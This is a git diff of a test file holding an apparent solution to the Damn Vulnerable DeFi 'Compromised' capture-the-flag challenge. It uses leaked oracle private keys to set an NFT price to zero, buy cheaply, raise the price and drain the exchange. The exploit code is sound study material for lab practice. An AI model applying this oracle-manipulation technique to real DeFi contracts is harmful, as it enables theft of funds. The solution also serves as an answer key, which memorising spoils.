@@ -51,64 +51,49 @@ describe('Compromised challenge', function () {
 
     it('Exploit', async function () {
         /** YOUR EXPLOIT GOES HERE */
-
-        // deterministically computes the smart contract address given
-        // the account the will deploy the contract (factory contract)
-        // the salt as uint256 and the contract bytecode
-        function buildCreate2Address(creatorAddress, saltHex, byteCode) {
-            return `0x${web3.utils.sha3(`0x${[
-                'ff',
-                creatorAddress,
-                saltHex,
-                web3.utils.sha3(byteCode)
-            ].map(x => x.replace(/0x/, ''))
-                .join('')}`).slice(-40)}`.toLowerCase()
-        }
-
-        // converts an int to uint256
-        function numberToUint256(value) {
-            const hex = value.toString(16)
-            return `0x${'0'.repeat(64 - hex.length)}${hex}`
-        }
-
-        // encodes parameter to pass as contract argument
-        function encodeParam(dataType, data) {
-            return web3.eth.abi.encodeParameter(dataType, data)
-        }
-
-        // returns true if contract is deployed on-chain
-        async function isContract(address) {
-            const code = await web3.eth.getCode(address)
-            return code.slice(2).length > 0
-        }
-
-        console.log('balance', this.initialAttackerbalance.toString());
-        console.log('price', (await this.oracle.getMedianPrice('DVNFT')).toString());
         
-        const tokenId = await this.exchange.buyOne({ from: attacker, value: '999000000000000000000' });
-        // online hex decode then base64 decode the string from the server and I got what looked like a private key
-        const leakedPrivKey = '0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a90x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48'
-        const leakedAccount = web3.eth.accounts.privateKeyToAccount(leakedPrivKey);
-        expect(sources[1] === leakedAccount.address, 'Leaked private key is for sources[1]');
-        await this.oracle.postPrice(new BN('0'), { from: leakedAccount.address });
-        console.log('price', (await this.oracle.getMedianPrice('DVNFT')).toString());
+        // online hex decode then base64 decode the string from the server and I got what looked like private keys
+        // there's a 0x within the string therefore a `split('0x')` will give private keys
+        const leakedAccounts = '0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a90x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48'
+            .split('0x').filter(x => !!x)
+            .map(x => (web3.eth.accounts.privateKeyToAccount(`0x${x}`)))
+        expect(leakedAccounts.length).eq(2);
 
-        // console.log(web3.eth.accounts.privateKeyToAccount('0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a90x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48'));
-        // // constructor arguments are appended to contract bytecode
-        // const bytecode = `${accountBytecode}${encodeParam('address', '0x262d41499c802decd532fd65d991e477a068e132').slice(2)}`
-        // const salt = 1
+        // have priv keys for the last 2 sources
+        expect(leakedAccounts[0].address).to.eq(sources[1], 'Found leaked private key is in sources');
+        expect(leakedAccounts[1].address).to.eq(sources[2], 'Found leaked private key is in sources');
 
-        // const computedAddr = buildCreate2Address(
-        //     factoryAddress,
-        //     numberToUint256(salt),
-        //     bytecode
-        // )
+        const encodedABI = this.oracle.contract.methods.postPrice(web3.utils.asciiToHex('DVNFT'), 0).encodeABI();
+        for (let i = 0; i < 2; i++) {
+            // import the new accounts so can be used by web3 to sign transactions
+            await web3.eth.personal.importRawKey(leakedAccounts[i].privateKey, '');
+            web3.eth.personal.unlockAccount(leakedAccounts[i].address, '', 999999);
+            // lower the price to 0 per token
+            await this.oracle.postPrice('DVNFT', new BN('0'), { from: leakedAccounts[i].address });
+        }
+        const latestPrice = (await this.oracle.getMedianPrice('DVNFT')).toString();
+        expect(latestPrice).to.eq('0', 'latest price is 0');
+        
+        // buy tokens
+        const tokenIdReceipt = await this.exchange.buyOne({ from: attacker, value: ether('1') });
+        const tokenId = parseInt(tokenIdReceipt.receipt.logs[0].args.tokenId);
+        expect(tokenId).to.gte(1, 'got a valid token id');
+
+        // raise back the price to 10k eth per token (max of exchange's balance)
+        for (let i = 0; i < 2; i++) {
+            await this.oracle.postPrice('DVNFT', ether('10000'), { from: leakedAccounts[i].address });
+        }
+        expect((await this.oracle.getMedianPrice('DVNFT')).toString()).to.eq(ether('10000').toString());
+        await this.token.approve(this.exchange.address, tokenId, { from: attacker });
+        await this.exchange.sellOne(tokenId, { from: attacker });
     });
 
     after(async function () {
         // Exchange must have lost all ETH
-        // expect(
-        //     await balance.current(this.exchange.address)
-        // ).to.be.bignumber.eq('0');
+        expect(
+            await balance.current(this.exchange.address)
+        ).to.be.bignumber.eq('0');
     });
 });
+
+
